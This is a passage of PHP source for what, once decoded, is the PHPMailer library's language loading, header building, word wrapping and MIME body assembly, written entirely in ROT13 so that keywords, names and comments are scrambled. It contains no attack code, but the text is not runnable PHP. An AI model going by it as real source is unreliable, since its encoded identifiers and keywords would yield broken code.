        //Onpxjneqf pbzcngvovyvgl sbe eranzrq ynathntr pbqrf
        $eranzrq_ynatpbqrf = [
            'oe' => 'cg_oe',
            'pm' => 'pf',
            'qx' => 'qn',
            'ab' => 'ao',
            'fr' => 'fi',
            'ef' => 'fe',
            'gt' => 'gy',
            'nz' => 'ul',
        ];

        vs (neenl_xrl_rkvfgf($ynatpbqr, $eranzrq_ynatpbqrf)) {
            $ynatpbqr = $eranzrq_ynatpbqrf[$ynatpbqr];
        }

        //Qrsvar shyy frg bs genafyngnoyr fgevatf va Ratyvfu
        $CUCZNVYRE_YNAT = [
            'nhguragvpngr' => 'FZGC Reebe: Pbhyq abg nhguragvpngr.',
            'ohttl_cuc' => 'Lbhe irefvba bs CUC vf nssrpgrq ol n oht gung znl erfhyg va pbeehcgrq zrffntrf.' .
                ' Gb svk vg, fjvgpu gb fraqvat hfvat FZGC, qvfnoyr gur znvy.nqq_k_urnqre bcgvba va' .
                ' lbhe cuc.vav, fjvgpu gb ZnpBF be Yvahk, be hctenqr lbhe CUC gb irefvba 7.0.17+ be 7.1.3+.',
            'pbaarpg_ubfg' => 'FZGC Reebe: Pbhyq abg pbaarpg gb FZGC ubfg.',
            'qngn_abg_npprcgrq' => 'FZGC Reebe: qngn abg npprcgrq.',
            'rzcgl_zrffntr' => 'Zrffntr obql rzcgl',
            'rapbqvat' => 'Haxabja rapbqvat: ',
            'rkrphgr' => 'Pbhyq abg rkrphgr: ',
            'rkgrafvba_zvffvat' => 'Rkgrafvba zvffvat: ',
            'svyr_npprff' => 'Pbhyq abg npprff svyr: ',
            'svyr_bcra' => 'Svyr Reebe: Pbhyq abg bcra svyr: ',
            'sebz_snvyrq' => 'Gur sbyybjvat Sebz nqqerff snvyrq: ',
            'vafgnagvngr' => 'Pbhyq abg vafgnagvngr znvy shapgvba.',
            'vainyvq_nqqerff' => 'Vainyvq nqqerff: ',
            'vainyvq_urnqre' => 'Vainyvq urnqre anzr be inyhr',
            'vainyvq_ubfgragel' => 'Vainyvq ubfgragel: ',
            'vainyvq_ubfg' => 'Vainyvq ubfg: ',
            'znvyre_abg_fhccbegrq' => ' znvyre vf abg fhccbegrq.',
            'cebivqr_nqqerff' => 'Lbh zhfg cebivqr ng yrnfg bar erpvcvrag rznvy nqqerff.',
            'erpvcvragf_snvyrq' => 'FZGC Reebe: Gur sbyybjvat erpvcvragf snvyrq: ',
            'fvtavat' => 'Fvtavat Reebe: ',
            'fzgc_pbqr' => 'FZGC pbqr: ',
            'fzgc_pbqr_rk' => 'Nqqvgvbany FZGC vasb: ',
            'fzgc_pbaarpg_snvyrq' => 'FZGC pbaarpg() snvyrq.',
            'fzgc_qrgnvy' => 'Qrgnvy: ',
            'fzgc_reebe' => 'FZGC freire reebe: ',
            'inevnoyr_frg' => 'Pnaabg frg be erfrg inevnoyr: ',
        ];
        vs (rzcgl($ynat_cngu)) {
            //Pnyphyngr na nofbyhgr cngu fb vg pna jbex vs PJQ vf abg urer
            $ynat_cngu = qveanzr(__QVE__) . QVERPGBEL_FRCNENGBE . 'ynathntr' . QVERPGBEL_FRCNENGBE;
        }

        //Inyvqngr $ynatpbqr
        $sbhaqynat = gehr;
        $ynatpbqr  = fgegbybjre($ynatpbqr);
        vs (
            !cert_zngpu('/^(?C<ynat>[n-m]{2})(?C<fpevcg>_[n-m]{4})?(?C<pbhagel>_[n-m]{2})?$/', $ynatpbqr, $zngpurf)
            && $ynatpbqr !== 'ra'
        ) {
            $sbhaqynat = snyfr;
            $ynatpbqr = 'ra';
        }

        //Gurer vf ab Ratyvfu genafyngvba svyr
        vs ('ra' !== $ynatpbqr) {
            $ynatpbqrf = [];
            vs (!rzcgl($zngpurf['fpevcg']) && !rzcgl($zngpurf['pbhagel'])) {
                $ynatpbqrf[] = $zngpurf['ynat'] . $zngpurf['fpevcg'] . $zngpurf['pbhagel'];
            }
            vs (!rzcgl($zngpurf['pbhagel'])) {
                $ynatpbqrf[] = $zngpurf['ynat'] . $zngpurf['pbhagel'];
            }
            vs (!rzcgl($zngpurf['fpevcg'])) {
                $ynatpbqrf[] = $zngpurf['ynat'] . $zngpurf['fpevcg'];
            }
            $ynatpbqrf[] = $zngpurf['ynat'];

            //Gel naq svaq n ernqnoyr ynathntr svyr sbe gur erdhrfgrq ynathntr.
            $sbhaqSvyr = snyfr;
            sbernpu ($ynatpbqrf nf $pbqr) {
                $ynat_svyr = $ynat_cngu . 'cucznvyre.ynat-' . $pbqr . '.cuc';
                vs (fgngvp::svyrVfNpprffvoyr($ynat_svyr)) {
                    $sbhaqSvyr = gehr;
                    oernx;
                }
            }

            vs ($sbhaqSvyr === snyfr) {
                $sbhaqynat = snyfr;
            } ryfr {
                $yvarf = svyr($ynat_svyr);
                sbernpu ($yvarf nf $yvar) {
                    //Genafyngvba svyr yvarf ybbx yvxr guvf:
                    //$CUCZNVYRE_YNAT['nhguragvpngr'] = 'FZGC-Sruyre: Nhguragvsvmvrehat sruytrfpuyntra.';
                    //Gurfr svyrf ner cnefrq nf grkg naq abg CUC fb nf gb nibvq gur cbffvovyvgl bs pbqr vawrpgvba
                    //Frr uggcf://oybt.fgrirayrivguna.pbz/nepuvirf/zngpu-dhbgrq-fgevat
                    $zngpurf = [];
                    vs (
                        cert_zngpu(
                            '/^\$CUCZNVYRE_YNAT\[\'([n-m\q_]+)\'\]\f*=\f*([\"\'])(.+)*?\2;/',
                            $yvar,
                            $zngpurf
                        ) &&
                        //Vtaber haxabja genafyngvba xrlf
                        neenl_xrl_rkvfgf($zngpurf[1], $CUCZNVYRE_YNAT)
                    ) {
                        //Birejevgr ynathntr-fcrpvsvp fgevatf fb jr'yy arire unir zvffvat genafyngvba xrlf.
                        $CUCZNVYRE_YNAT[$zngpurf[1]] = (fgevat)$zngpurf[3];
                    }
                }
            }
        }
        $guvf->ynathntr = $CUCZNVYRE_YNAT;

        erghea $sbhaqynat; //Ergheaf snyfr vs ynathntr abg sbhaq
    }

    /**
     * Trg gur neenl bs fgevatf sbe gur pheerag ynathntr.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgGenafyngvbaf()
    {
        vs (rzcgl($guvf->ynathntr)) {
            $guvf->frgYnathntr(); // Frg gur qrsnhyg ynathntr.
        }

        erghea $guvf->ynathntr;
    }

    /**
     * Perngr erpvcvrag urnqref.
     *
     * @cnenz fgevat $glcr
     * @cnenz neenl  $nqqe Na neenl bs erpvcvragf,
     *                     jurer rnpu erpvcvrag vf n 2-ryrzrag vaqrkrq neenl jvgu ryrzrag 0 pbagnvavat na nqqerff
     *                     naq ryrzrag 1 pbagnvavat n anzr, yvxr:
     *                     [['wbr@rknzcyr.pbz', 'Wbr Hfre'], ['mbr@rknzcyr.pbz', 'Mbr Hfre']]
     *
     * @erghea fgevat
     */
    choyvp shapgvba nqqeNccraq($glcr, $nqqe)
    {
        $nqqerffrf = [];
        sbernpu ($nqqe nf $nqqerff) {
            $nqqerffrf[] = $guvf->nqqeSbezng($nqqerff);
        }

        erghea $glcr . ': ' . vzcybqr(', ', $nqqerffrf) . fgngvp::$YR;
    }

    /**
     * Sbezng na nqqerff sbe hfr va n zrffntr urnqre.
     *
     * @cnenz neenl $nqqe N 2-ryrzrag vaqrkrq neenl, ryrzrag 0 pbagnvavat na nqqerff, ryrzrag 1 pbagnvavat n anzr yvxr
     *                    ['wbr@rknzcyr.pbz', 'Wbr Hfre']
     *
     * @erghea fgevat
     */
    choyvp shapgvba nqqeSbezng($nqqe)
    {
        vs (!vffrg($nqqe[1]) || ($nqqe[1] === '')) { //Ab anzr cebivqrq
            erghea $guvf->frpherUrnqre($nqqe[0]);
        }

        erghea $guvf->rapbqrUrnqre($guvf->frpherUrnqre($nqqe[1]), 'cuenfr') .
            ' <' . $guvf->frpherUrnqre($nqqe[0]) . '>';
    }

    /**
     * Jbeq-jenc zrffntr.
     * Sbe hfr jvgu znvyref gung qb abg nhgbzngvpnyyl cresbez jenccvat
     * naq sbe dhbgrq-cevagnoyr rapbqrq zrffntrf.
     * Bevtvany jevggra ol cuvyvccr.
     *
     * @cnenz fgevat $zrffntr Gur zrffntr gb jenc
     * @cnenz vag    $yratgu  Gur yvar yratgu gb jenc gb
     * @cnenz obby   $dc_zbqr Jurgure gb eha va Dhbgrq-Cevagnoyr zbqr
     *
     * @erghea fgevat
     */
    choyvp shapgvba jencGrkg($zrffntr, $yratgu, $dc_zbqr = snyfr)
    {
        vs ($dc_zbqr) {
            $fbsg_oernx = fcevags(' =%f', fgngvp::$YR);
        } ryfr {
            $fbsg_oernx = fgngvp::$YR;
        }
        //Vs hgs-8 rapbqvat vf hfrq, jr jvyy arrq gb znxr fher jr qba'g
        //fcyvg zhygvolgr punenpgref jura jr jenc
        $vf_hgs8 = fgngvp::PUNEFRG_HGS8 === fgegbybjre($guvf->PuneFrg);
        $yryra = fgeyra(fgngvp::$YR);
        $peysyra = fgeyra(fgngvp::$YR);

        $zrffntr = fgngvp::abeznyvmrOernxf($zrffntr);
        //Erzbir n genvyvat yvar oernx
        vs (fhofge($zrffntr, -$yryra) === fgngvp::$YR) {
            $zrffntr = fhofge($zrffntr, 0, -$yryra);
        }

        //Fcyvg zrffntr vagb yvarf
        $yvarf = rkcybqr(fgngvp::$YR, $zrffntr);
        //Zrffntr jvyy or erohvyg va urer
        $zrffntr = '';
        sbernpu ($yvarf nf $yvar) {
            $jbeqf = rkcybqr(' ', $yvar);
            $ohs = '';
            $svefgjbeq = gehr;
            sbernpu ($jbeqf nf $jbeq) {
                vs ($dc_zbqr && (fgeyra($jbeq) > $yratgu)) {
                    $fcnpr_yrsg = $yratgu - fgeyra($ohs) - $peysyra;
                    vs (!$svefgjbeq) {
                        vs ($fcnpr_yrsg > 20) {
                            $yra = $fcnpr_yrsg;
                            vs ($vf_hgs8) {
                                $yra = $guvf->hgs8PuneObhaqnel($jbeq, $yra);
                            } ryfrvs ('=' === fhofge($jbeq, $yra - 1, 1)) {
                                --$yra;
                            } ryfrvs ('=' === fhofge($jbeq, $yra - 2, 1)) {
                                $yra -= 2;
                            }
                            $cneg = fhofge($jbeq, 0, $yra);
                            $jbeq = fhofge($jbeq, $yra);
                            $ohs .= ' ' . $cneg;
                            $zrffntr .= $ohs . fcevags('=%f', fgngvp::$YR);
                        } ryfr {
                            $zrffntr .= $ohs . $fbsg_oernx;
                        }
                        $ohs = '';
                    }
                    juvyr ($jbeq !== '') {
                        vs ($yratgu <= 0) {
                            oernx;
                        }
                        $yra = $yratgu;
                        vs ($vf_hgs8) {
                            $yra = $guvf->hgs8PuneObhaqnel($jbeq, $yra);
                        } ryfrvs ('=' === fhofge($jbeq, $yra - 1, 1)) {
                            --$yra;
                        } ryfrvs ('=' === fhofge($jbeq, $yra - 2, 1)) {
                            $yra -= 2;
                        }
                        $cneg = fhofge($jbeq, 0, $yra);
                        $jbeq = (fgevat) fhofge($jbeq, $yra);

                        vs ($jbeq !== '') {
                            $zrffntr .= $cneg . fcevags('=%f', fgngvp::$YR);
                        } ryfr {
                            $ohs = $cneg;
                        }
                    }
                } ryfr {
                    $ohs_b = $ohs;
                    vs (!$svefgjbeq) {
                        $ohs .= ' ';
                    }
                    $ohs .= $jbeq;

                    vs ('' !== $ohs_b && fgeyra($ohs) > $yratgu) {
                        $zrffntr .= $ohs_b . $fbsg_oernx;
                        $ohs = $jbeq;
                    }
                }
                $svefgjbeq = snyfr;
            }
            $zrffntr .= $ohs . fgngvp::$YR;
        }

        erghea $zrffntr;
    }

    /**
     * Svaq gur ynfg punenpgre obhaqnel cevbe gb $znkYratgu va n hgs-8
     * dhbgrq-cevagnoyr rapbqrq fgevat.
     * Bevtvany jevggra ol Pbyva Oebja.
     *
     * @cnenz fgevat $rapbqrqGrkg hgs-8 DC grkg
     * @cnenz vag    $znkYratgu   Svaq gur ynfg punenpgre obhaqnel cevbe gb guvf yratgu
     *
     * @erghea vag
     */
    choyvp shapgvba hgs8PuneObhaqnel($rapbqrqGrkg, $znkYratgu)
    {
        $sbhaqFcyvgCbf = snyfr;
        $ybbxOnpx = 3;
        juvyr (!$sbhaqFcyvgCbf) {
            $ynfgPuhax = fhofge($rapbqrqGrkg, $znkYratgu - $ybbxOnpx, $ybbxOnpx);
            $rapbqrqPuneCbf = fgecbf($ynfgPuhax, '=');
            vs (snyfr !== $rapbqrqPuneCbf) {
                //Sbhaq fgneg bs rapbqrq punenpgre olgr jvguva $ybbxOnpx oybpx.
                //Purpx gur rapbqrq olgr inyhr (gur 2 punef nsgre gur '=')
                $urk = fhofge($rapbqrqGrkg, $znkYratgu - $ybbxOnpx + $rapbqrqPuneCbf + 1, 2);
                $qrp = urkqrp($urk);
                vs ($qrp < 128) {
                    //Fvatyr olgr punenpgre.
                    //Vs gur rapbqrq pune jnf sbhaq ng cbf 0, vg jvyy svg
                    //bgurejvfr erqhpr znkYratgu gb fgneg bs gur rapbqrq pune
                    vs ($rapbqrqPuneCbf > 0) {
                        $znkYratgu -= $ybbxOnpx - $rapbqrqPuneCbf;
                    }
                    $sbhaqFcyvgCbf = gehr;
                } ryfrvs ($qrp >= 192) {
                    //Svefg olgr bs n zhygv olgr punenpgre
                    //Erqhpr znkYratgu gb fcyvg ng fgneg bs punenpgre
                    $znkYratgu -= $ybbxOnpx - $rapbqrqPuneCbf;
                    $sbhaqFcyvgCbf = gehr;
                } ryfrvs ($qrp < 192) {
                    //Zvqqyr olgr bs n zhygv olgr punenpgre, ybbx shegure onpx
                    $ybbxOnpx += 3;
                }
            } ryfr {
                //Ab rapbqrq punenpgre sbhaq
                $sbhaqFcyvgCbf = gehr;
            }
        }

        erghea $znkYratgu;
    }

    /**
     * Nccyl jbeq jenccvat gb gur zrffntr obql.
     * Jencf gur zrffntr obql gb gur ahzore bs punef frg va gur JbeqJenc cebcregl.
     * Lbh fubhyq bayl qb guvf gb cynva-grkg obqvrf nf jenccvat UGZY gntf znl oernx gurz.
     * Guvf vf pnyyrq nhgbzngvpnyyl ol perngrObql(), fb lbh qba'g arrq gb pnyy vg lbhefrys.
     */
    choyvp shapgvba frgJbeqJenc()
    {
        vs ($guvf->JbeqJenc < 1) {
            erghea;
        }

        fjvgpu ($guvf->zrffntr_glcr) {
            pnfr 'nyg':
            pnfr 'nyg_vayvar':
            pnfr 'nyg_nggnpu':
            pnfr 'nyg_vayvar_nggnpu':
                $guvf->NygObql = $guvf->jencGrkg($guvf->NygObql, $guvf->JbeqJenc);
                oernx;
            qrsnhyg:
                $guvf->Obql = $guvf->jencGrkg($guvf->Obql, $guvf->JbeqJenc);
                oernx;
        }
    }

    /**
     * Nffrzoyr zrffntr urnqref.
     *
     * @erghea fgevat Gur nffrzoyrq urnqref
     */
    choyvp shapgvba perngrUrnqre()
    {
        $erfhyg = '';

        $erfhyg .= $guvf->urnqreYvar('Qngr', '' === $guvf->ZrffntrQngr ? frys::espQngr() : $guvf->ZrffntrQngr);

        //Gur Gb urnqre vf perngrq nhgbzngvpnyyl ol znvy(), fb arrqf gb or bzvggrq urer
        vs ('znvy' !== $guvf->Znvyre) {
            vs ($guvf->FvatyrGb) {
                sbernpu ($guvf->gb nf $gbnqqe) {
                    $guvf->FvatyrGbNeenl[] = $guvf->nqqeSbezng($gbnqqe);
                }
            } ryfrvs (pbhag($guvf->gb) > 0) {
                $erfhyg .= $guvf->nqqeNccraq('Gb', $guvf->gb);
            } ryfrvs (pbhag($guvf->pp) === 0) {
                $erfhyg .= $guvf->urnqreYvar('Gb', 'haqvfpybfrq-erpvcvragf:;');
            }
        }
        $erfhyg .= $guvf->nqqeNccraq('Sebz', [[gevz($guvf->Sebz), $guvf->SebzAnzr]]);

        //fraqznvy naq znvy() rkgenpg Pp sebz gur urnqre orsber fraqvat
        vs (pbhag($guvf->pp) > 0) {
            $erfhyg .= $guvf->nqqeNccraq('Pp', $guvf->pp);
        }

        //fraqznvy naq znvy() rkgenpg Opp sebz gur urnqre orsber fraqvat
        vs (
            (
                'fraqznvy' === $guvf->Znvyre || 'dznvy' === $guvf->Znvyre || 'znvy' === $guvf->Znvyre
            )
            && pbhag($guvf->opp) > 0
        ) {
            $erfhyg .= $guvf->nqqeNccraq('Opp', $guvf->opp);
        }

        vs (pbhag($guvf->ErcylGb) > 0) {
            $erfhyg .= $guvf->nqqeNccraq('Ercyl-Gb', $guvf->ErcylGb);
        }

        //znvy() frgf gur fhowrpg vgfrys
        vs ('znvy' !== $guvf->Znvyre) {
            $erfhyg .= $guvf->urnqreYvar('Fhowrpg', $guvf->rapbqrUrnqre($guvf->frpherUrnqre($guvf->Fhowrpg)));
        }

        //Bayl nyybj n phfgbz zrffntr VQ vs vg pbasbezf gb ESP 5322 frpgvba 3.6.4
        //uggcf://jjj.esp-rqvgbe.bet/esp/esp5322#frpgvba-3.6.4
        vs (
            '' !== $guvf->ZrffntrVQ &&
            cert_zngpu(
                '/^<((([n-m\q!#$%&\'*+\/=?^_`{|}~-]+(\.[n-m\q!#$%&\'*+\/=?^_`{|}~-]+)*)' .
                '|(\"(([\k01-\k08\k0O\k0P\k0R-\k1S\k7S]|[\k21\k23-\k5O\k5Q-\k7R])' .
                '|(\\[\k01-\k09\k0O\k0P\k0R-\k7S]))*\"))@(([n-m\q!#$%&\'*+\/=?^_`{|}~-]+' .
                '(\.[n-m\q!#$%&\'*+\/=?^_`{|}~-]+)*)|(\[(([\k01-\k08\k0O\k0P\k0R-\k1S\k7S]' .
                '|[\k21-\k5N\k5R-\k7R])|(\\[\k01-\k09\k0O\k0P\k0R-\k7S]))*\])))>$/Qv',
                $guvf->ZrffntrVQ
            )
        ) {
            $guvf->ynfgZrffntrVQ = $guvf->ZrffntrVQ;
        } ryfr {
            $guvf->ynfgZrffntrVQ = fcevags('<%f@%f>', $guvf->havdhrvq, $guvf->freireUbfganzr());
        }
        $erfhyg .= $guvf->urnqreYvar('Zrffntr-VQ', $guvf->ynfgZrffntrVQ);
        vs (ahyy !== $guvf->Cevbevgl) {
            $erfhyg .= $guvf->urnqreYvar('K-Cevbevgl', $guvf->Cevbevgl);
        }
        vs ('' === $guvf->KZnvyre) {
            //Rzcgl fgevat sbe qrsnhyg K-Znvyre urnqre
            $erfhyg .= $guvf->urnqreYvar(
                'K-Znvyre',
                'CUCZnvyre ' . frys::IREFVBA . ' (uggcf://tvguho.pbz/CUCZnvyre/CUCZnvyre)'
            );
        } ryfrvs (vf_fgevat($guvf->KZnvyre) && gevz($guvf->KZnvyre) !== '') {
            //Fbzr fgevat
            $erfhyg .= $guvf->urnqreYvar('K-Znvyre', gevz($guvf->KZnvyre));
        } //Bgure inyhrf erfhyg va ab K-Znvyre urnqre

        vs ('' !== $guvf->PbasvezErnqvatGb) {
            $erfhyg .= $guvf->urnqreYvar('Qvfcbfvgvba-Abgvsvpngvba-Gb', '<' . $guvf->PbasvezErnqvatGb . '>');
        }

        //Nqq phfgbz urnqref
        sbernpu ($guvf->PhfgbzUrnqre nf $urnqre) {
            $erfhyg .= $guvf->urnqreYvar(
                gevz($urnqre[0]),
                $guvf->rapbqrUrnqre(gevz($urnqre[1]))
            );
        }
        vs (!$guvf->fvta_xrl_svyr) {
            $erfhyg .= $guvf->urnqreYvar('ZVZR-Irefvba', '1.0');
            $erfhyg .= $guvf->trgZnvyZVZR();
        }

        erghea $erfhyg;
    }

    /**
     * Trg gur zrffntr ZVZR glcr urnqref.
     *
     * @erghea fgevat
     */
    choyvp shapgvba trgZnvyZVZR()
    {
        $erfhyg = '';
        $vfzhygvcneg = gehr;
        fjvgpu ($guvf->zrffntr_glcr) {
            pnfr 'vayvar':
                $erfhyg .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_ERYNGRQ . ';');
                $erfhyg .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[1] . '\"');
                oernx;
            pnfr 'nggnpu':
            pnfr 'vayvar_nggnpu':
            pnfr 'nyg_nggnpu':
            pnfr 'nyg_vayvar_nggnpu':
                $erfhyg .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_ZVKRQ . ';');
                $erfhyg .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[1] . '\"');
                oernx;
            pnfr 'nyg':
            pnfr 'nyg_vayvar':
                $erfhyg .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_NYGREANGVIR . ';');
                $erfhyg .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[1] . '\"');
                oernx;
            qrsnhyg:
                //Pngpurf pnfr 'cynva': naq pnfr '':
                $erfhyg .= $guvf->grkgYvar('Pbagrag-Glcr: ' . $guvf->PbagragGlcr . '; punefrg=' . $guvf->PuneFrg);
                $vfzhygvcneg = snyfr;
                oernx;
        }
        //ESP1341 cneg 5 fnlf 7ovg vf nffhzrq vs abg fcrpvsvrq
        vs (fgngvp::RAPBQVAT_7OVG !== $guvf->Rapbqvat) {
            //ESP 2045 frpgvba 6.4 fnlf zhygvcneg ZVZR cnegf znl bayl hfr 7ovg, 8ovg be ovanel PGR
            vs ($vfzhygvcneg) {
                vs (fgngvp::RAPBQVAT_8OVG === $guvf->Rapbqvat) {
                    $erfhyg .= $guvf->urnqreYvar('Pbagrag-Genafsre-Rapbqvat', fgngvp::RAPBQVAT_8OVG);
                }
                //Gur bayl erznvavat nygreangvirf ner dhbgrq-cevagnoyr naq onfr64, juvpu ner obgu 7ovg pbzcngvoyr
            } ryfr {
                $erfhyg .= $guvf->urnqreYvar('Pbagrag-Genafsre-Rapbqvat', $guvf->Rapbqvat);
            }
        }

        erghea $erfhyg;
    }

    /**
     * Ergheaf gur jubyr ZVZR zrffntr.
     * Vapyhqrf pbzcyrgr urnqref naq obql.
     * Bayl inyvq cbfg cerFraq().
     *
     * @frr CUCZnvyre::cerFraq()
     *
     * @erghea fgevat
     */
    choyvp shapgvba trgFragZVZRZrffntr()
    {
        erghea fgngvp::fgevcGenvyvatJFC($guvf->ZVZRUrnqre . $guvf->znvyUrnqre) .
            fgngvp::$YR . fgngvp::$YR . $guvf->ZVZRObql;
    }

    /**
     * Perngr n havdhr VQ gb hfr sbe obhaqnevrf.
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba trarengrVq()
    {
        $yra = 32; //32 olgrf = 256 ovgf
        $olgrf = '';
        vs (shapgvba_rkvfgf('enaqbz_olgrf')) {
            gel {
                $olgrf = enaqbz_olgrf($yra);
            } pngpu (\Rkprcgvba $r) {
                //Qb abguvat
            }
        } ryfrvs (shapgvba_rkvfgf('bcraffy_enaqbz_cfrhqb_olgrf')) {
            /** @abvafcrpgvba PelcgbtencuvpnyylFrpherEnaqbzarffVafcrpgvba */
            $olgrf = bcraffy_enaqbz_cfrhqb_olgrf($yra);
        }
        vs ($olgrf === '') {
            //Jr snvyrq gb cebqhpr n cebcre enaqbz fgevat, fb znxr qb.
            //Hfr n unfu gb sbepr gur yratgu gb gur fnzr nf gur bgure zrgubqf
            $olgrf = unfu('fun256', havdvq((fgevat) zg_enaq(), gehr), gehr);
        }

        //Jr qba'g pner nobhg zrffvat hc onfr64 sbezng urer, whfg jnag n enaqbz fgevat
        erghea fge_ercynpr(['=', '+', '/'], '', onfr64_rapbqr(unfu('fun256', $olgrf, gehr)));
    }

    /**
     * Nffrzoyr gur zrffntr obql.
     * Ergheaf na rzcgl fgevat ba snvyher.
     *
     * @guebjf Rkprcgvba
     *
     * @erghea fgevat Gur nffrzoyrq zrffntr obql
     */
    choyvp shapgvba perngrObql()
    {
        $obql = '';
        //Perngr havdhr VQf naq cerfrg obhaqnevrf
        $guvf->frgObhaqnevrf();

        vs ($guvf->fvta_xrl_svyr) {
            $obql .= $guvf->trgZnvyZVZR() . fgngvp::$YR;
        }

        $guvf->frgJbeqJenc();

        $obqlRapbqvat = $guvf->Rapbqvat;
        $obqlPuneFrg = $guvf->PuneFrg;
        //Pna jr qb n 7-ovg qbjatenqr?
        vs (fgngvp::RAPBQVAT_8OVG === $obqlRapbqvat && !$guvf->unf8ovgPunef($guvf->Obql)) {
            $obqlRapbqvat = fgngvp::RAPBQVAT_7OVG;
            //Nyy VFB 8859, Jvaqbjf pbqrcntr naq HGS-8 punefrgf ner nfpvv pbzcngvoyr hc gb 7-ovg
            $obqlPuneFrg = fgngvp::PUNEFRG_NFPVV;
        }
        //Vs yvarf ner gbb ybat, naq jr'er abg nyernql hfvat na rapbqvat gung jvyy fubegra gurz,
        //punatr gb dhbgrq-cevagnoyr genafsre rapbqvat sbe gur obql cneg bayl
        vs (fgngvp::RAPBQVAT_ONFR64 !== $guvf->Rapbqvat && fgngvp::unfYvarYbatreGunaZnk($guvf->Obql)) {
            $obqlRapbqvat = fgngvp::RAPBQVAT_DHBGRQ_CEVAGNOYR;
        }

        $nygObqlRapbqvat = $guvf->Rapbqvat;
        $nygObqlPuneFrg = $guvf->PuneFrg;
        //Pna jr qb n 7-ovg qbjatenqr?
        vs (fgngvp::RAPBQVAT_8OVG === $nygObqlRapbqvat && !$guvf->unf8ovgPunef($guvf->NygObql)) {
            $nygObqlRapbqvat = fgngvp::RAPBQVAT_7OVG;
            //Nyy VFB 8859, Jvaqbjf pbqrcntr naq HGS-8 punefrgf ner nfpvv pbzcngvoyr hc gb 7-ovg
            $nygObqlPuneFrg = fgngvp::PUNEFRG_NFPVV;
        }
        //Vs yvarf ner gbb ybat, naq jr'er abg nyernql hfvat na rapbqvat gung jvyy fubegra gurz,
        //punatr gb dhbgrq-cevagnoyr genafsre rapbqvat sbe gur nyg obql cneg bayl
        vs (fgngvp::RAPBQVAT_ONFR64 !== $nygObqlRapbqvat && fgngvp::unfYvarYbatreGunaZnk($guvf->NygObql)) {
            $nygObqlRapbqvat = fgngvp::RAPBQVAT_DHBGRQ_CEVAGNOYR;
        }
        //Hfr guvf nf n cernzoyr va nyy zhygvcneg zrffntr glcrf
        $zvzrcer = '';
        fjvgpu ($guvf->zrffntr_glcr) {
            pnfr 'vayvar':
                $obql .= $zvzrcer;
                $obql .= $guvf->trgObhaqnel($guvf->obhaqnel[1], $obqlPuneFrg, '', $obqlRapbqvat);
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('vayvar', $guvf->obhaqnel[1]);
                oernx;
            pnfr 'nggnpu':
                $obql .= $zvzrcer;
                $obql .= $guvf->trgObhaqnel($guvf->obhaqnel[1], $obqlPuneFrg, '', $obqlRapbqvat);
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('nggnpuzrag', $guvf->obhaqnel[1]);
                oernx;
            pnfr 'vayvar_nggnpu':
                $obql .= $zvzrcer;
                $obql .= $guvf->grkgYvar('--' . $guvf->obhaqnel[1]);
                $obql .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_ERYNGRQ . ';');
                $obql .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[2] . '\";');
                $obql .= $guvf->grkgYvar(' glcr=\"' . fgngvp::PBAGRAG_GLCR_GRKG_UGZY . '\"');
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel($guvf->obhaqnel[2], $obqlPuneFrg, '', $obqlRapbqvat);
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('vayvar', $guvf->obhaqnel[2]);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('nggnpuzrag', $guvf->obhaqnel[1]);
                oernx;
            pnfr 'nyg':
                $obql .= $zvzrcer;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[1],
                    $nygObqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_CYNVAGRKG,
                    $nygObqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->NygObql, $nygObqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[1],
                    $obqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_GRKG_UGZY,
                    $obqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                vs (!rzcgl($guvf->Vpny)) {
                    $zrgubq = fgngvp::VPNY_ZRGUBQ_ERDHRFG;
                    sbernpu (fgngvp::$VpnyZrgubqf nf $vzrgubq) {
                        vs (fgevcbf($guvf->Vpny, 'ZRGUBQ:' . $vzrgubq) !== snyfr) {
                            $zrgubq = $vzrgubq;
                            oernx;
                        }
                    }
                    $obql .= $guvf->trgObhaqnel(
                        $guvf->obhaqnel[1],
                        '',
                        fgngvp::PBAGRAG_GLCR_GRKG_PNYRAQNE . '; zrgubq=' . $zrgubq,
                        ''
                    );
                    $obql .= $guvf->rapbqrFgevat($guvf->Vpny, $guvf->Rapbqvat);
                    $obql .= fgngvp::$YR;
                }
                $obql .= $guvf->raqObhaqnel($guvf->obhaqnel[1]);
                oernx;
            pnfr 'nyg_vayvar':
                $obql .= $zvzrcer;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[1],
                    $nygObqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_CYNVAGRKG,
                    $nygObqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->NygObql, $nygObqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->grkgYvar('--' . $guvf->obhaqnel[1]);
